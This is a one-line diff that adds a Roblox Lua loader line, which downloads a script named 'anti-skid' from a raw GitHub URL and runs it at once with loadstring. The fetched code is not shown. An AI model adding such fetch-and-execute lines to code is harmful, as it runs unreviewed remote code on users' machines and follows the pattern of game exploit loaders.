@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/romoneand/anti-skid/main/Anti%20skid'))() 
